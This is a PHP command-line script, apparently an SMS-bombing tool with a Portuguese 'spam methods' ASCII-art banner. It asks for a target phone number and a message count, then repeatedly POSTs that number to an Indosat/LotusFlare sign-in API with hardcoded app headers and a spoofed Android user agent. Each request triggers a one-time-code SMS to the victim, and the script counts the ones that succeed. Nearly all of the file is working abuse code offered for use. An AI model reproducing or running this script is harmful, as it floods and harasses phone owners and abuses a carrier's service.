 <?php
$banner = "\e[33;1m   
[METODOS DE SPAM DO 乙モUち]     
⣿⣿⣿⣿⣿⣿⣿⣿⠿⠛⠋⠉⠁⠄⠄⠈⠙⠻⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⠟⠁⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠙⢿⣿
⣿⣿⣿⣿⡿⠃⠄⠄⠄⢀⣀⣀⡀⠄⠄⠄⠄⠄⠄⠄⠈⢿
⣿⣿⣿⡟⠄⠄⠄⠄⠐⢻⣿⣿⣿⣷⡄⠄⠄⠄⠄⠄⠄⠈
⣿⣿⣿⠃⠄⠄⠄⢀⠴⠛⠙⣿⣿⡿⣿⣦⠄⠄⠄⠄⠄⠄
⣿⣿⠃⠄⢠⡖⠉⠄⠄⠄⣠⣿⡏⠄⢹⣿⠄⠄⠄⠄⠄⢠
⣿⠃⠄⠄⢸⣧⣤⣤⣤⢾⣿⣿⡇⠄⠈⢻⡆⠄⠄⠄⠄⣾
⠁⠄⠄⠄⠈⠉⠛⢿⡟⠉⠉⣿⣷⣀⠄⠄⣿⡆⠄⠄⢠⣿
⠄⠄⠄⠄⠄⠄⢠⡿⠿⢿⣷⣿⣿⣿⣿⣿⠿⠃⠄⠄⣸⣿
⠄⠄⠄⠄⠄⢀⡞⠄⠄⠄⠈⣿⣿⣿⡟⠁⠄⠄⠄⠄⣿⣿
⠄⠄⠄⠄⠄⢸⠄⠄⠄⠄⢀⣿⣿⡟⠄⠄⠄⠄⠄⢠⣿⣿
⠄⠄⠄⠄⠄⠘⠄⠄⠄⢀⡼⠛⠉⠄⠄⠄⠄⠄⠄⣼⣿⣿
⠄⠄⠄⠄⠄⡇⠄⠄⢀⠎⠄⠄⠄⠄[下メ-乙モUち]
⠄⠄⠄⠄⢰⠃⠄⢀⠎⠄⠄.[site:https://fln.app/flood_ajuda]
\n\n";
sleep(3);
echo $banner;
sleep(2);
echo "\e[33;1m>>> Número alvo(exemplo: +55) : ";
$target = trim(fgets(STDIN));
sleep(2);
echo ">>> valor\nDigite o número do SMS: ";
$jum = trim(fgets(STDIN));
for ($i=1; $i <= $jum; $i++) {
$header = array("Content-Type: application/json", "operatorId: 50e22f864fc644c081c0e18319187547", "appId: 168e2950623a4dbe8a57beec814ad6b5", "clientVersion: 127");
$post = array("msisdn" => "$target");
$data = json_encode($post);
$g = curl_init();
curl_setopt($g, CURLOPT_URL, "https://osa-indosat.lotusflare.com/api/1.0/dcp/user/indosat_begin_sign_in");
curl_setopt($g, CURLOPT_RETURNTRANSFER, true);
curl_setopt($g, CURLOPT_POST, true);
curl_setopt($g, CURLOPT_HEADER, true);
curl_setopt($g, CURLOPT_POSTFIELDS, $data);
curl_setopt($g, CURLOPT_HTTPHEADER, $header);
curl_setopt($g, CURLOPT_USERAGENT, "Dalvik/2.1.0 (Linux; U; Android 6.0.1; ASUS_X00AD Build/MMB29M)");
$h = curl_exec($g);
curl_close($g);
preg_match("/challengeId/i", $h, $respon);
if ($respon[0] == "challengeId") {
	echo $i. ".~Succes Full Terkirim ~\n";
	}else{
		echo $i. ".fail maybe you are not handsome\n";
		}
	}
?>
// fim, direitos autorais. do meu pai @fxzeuskwai 
